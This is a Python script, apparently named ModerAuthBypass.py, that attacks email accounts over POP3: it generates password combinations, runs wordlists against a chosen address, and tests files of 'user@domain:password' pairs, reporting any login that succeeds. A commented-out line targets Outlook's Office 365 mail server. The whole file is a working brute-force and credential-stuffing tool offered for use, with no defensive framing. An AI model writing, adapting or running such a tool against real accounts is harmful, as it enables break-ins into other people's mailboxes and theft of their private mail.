# coding=utf-8
import argparse
import itertools
import json
import poplib
import smtplib
from argparse import RawTextHelpFormatter


parser = argparse.ArgumentParser(add_help=False, formatter_class=RawTextHelpFormatter)
parser.add_argument('--module', dest='k_module', help='select Module -m brute | check | wordlist', required=True)
parser.add_argument('-e','--emial', dest='k_email', help='email', required=False)
parser.add_argument('-p', dest='k_pass', help='Password ', required=False)
parser.add_argument('-f', dest='k_word', help='wordlist.txt ', required=False)
parser.add_argument('-w', dest='k_vetor', help='lista dado:dados:senhas', required=False)
parser.add_argument('-m', dest='k_min', help='minum 0', required=False)
parser.add_argument('-M', dest='k_max', help='Max X', required=False)
parser.add_argument('-pf', dest='k_fileformat', help='pass file  with user and passwrod   username@domain.com:password', required=False)

parser.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help='Exemplo:\n'
                                                                                   'python ModerAuthBypass.py --module check -e demo@email.com -p password\n'
                                                                                   'python ModerAuthBypass.py --module brute -e demo@email.com -m0 -M2 -w key1:key2:key3\n'
                                                                                   'python ModerAuthBypass.py --module wordlist -e demo@email.com -f wordlist.txt\n'
                                                                                   'python ModerAuthBypass.py --module config \n'
                                                                                   'python ModerAuthBypass.py --module passFile -pf userPass.txt\n')
args = parser.parse_args()


def configure():
    import json

    smt_url = input("SMTP/POP3: ")
    smtp_port = input("SMTP PORT: ")

    dic = {
        'smtp_url': f'{smt_url}',
        'smtp_port': f'{int(smtp_port)}'
    }

    # Serializing json
    json_object = json.dumps(dic, indent=4)

    # Writing to sample.json
    with open("conf/config.json", "w") as outfile:
        outfile.write(json_object)

def conect_mail(useremail, password):
    configs = open("conf/config.json")
    config_data = json.load(configs)


    try:
        Mailbox = poplib.POP3_SSL(f"{config_data['smtp_url']}", f"{config_data['smtp_port']}")
        #Mailbox = poplib.POP3_SSL(f'outlook.office365.com', '995')
        Mailbox.user(useremail)
        Mailbox.pass_(password)
        return (Mailbox.welcome)
    except:
        pass


def brute():

    n = (int(args.k_min))
    m = (int(args.k_max))

    wordlist = []
    passwordfound = ()

    chrs = (args.k_vetor).split(':')

    while n <= m:
        n += 1
        for xz in itertools.product(chrs, repeat=n):
            wordlist += [('').join(xz)]
        #	print(args.k_num)

    for word in wordlist:
        print (f'Passwords: {word}', end='\r', flush=True)

        retorno = str(conect_mail(args.k_email,word))

        if '+OK' in  retorno:
            print ('[+] Password Found {} : {} '.format(args.k_email, word))
            # sendMail(args.k_email,passwordfound)
            break


def check(email, password):
    retorno = str(conect_mail(email, password))

    if '+OK' in retorno:
        print(f'[+] Password Found {email} : {password}')
        # sendMail(args.k_email,passwordfound)
    else:
        print("[-] Not Access your Account")


def wordbrute(arqword, email):

    wordlist = open(arqword,'r').readlines()
    for word in wordlist:
        retorno = str(conect_mail(email, word))

        if '+OK' in retorno:
            print(f'[+] Password Found {email} : {word}')
            # sendMail(args.k_email,passwordfound)
            break
        else:
            print("[-] Not Access your Account")


def fileformat(arqword):

    wordlist = open(arqword,'r').readlines()
    for word in wordlist:
        chrs = (word).split(':')


        retorno = str(conect_mail(chrs[0], chrs[1]))

        if '+OK' in retorno:
            print(f'[+] Password Found {chrs[0]} : {chrs[1]}')
            # sendMail(args.k_email,passwordfound)
            
        else:
            print(f"[-] Not Access your Account {chrs[0]} {chrs[1]}")


if args.k_module == "brute":
    brute()


elif args.k_module == "check":
    check(args.k_email, args.k_pass)


elif args.k_module == "wordlist":
    wordbrute(args.k_word, args.k_email)


elif args.k_module == "config":
    configure()


elif args.k_module == "passFile":
    fileformat(args.k_fileformat)


else:
    print("Please select module 'brute' | 'check' | 'wordlist'  | 'config' | 'passFile' ")
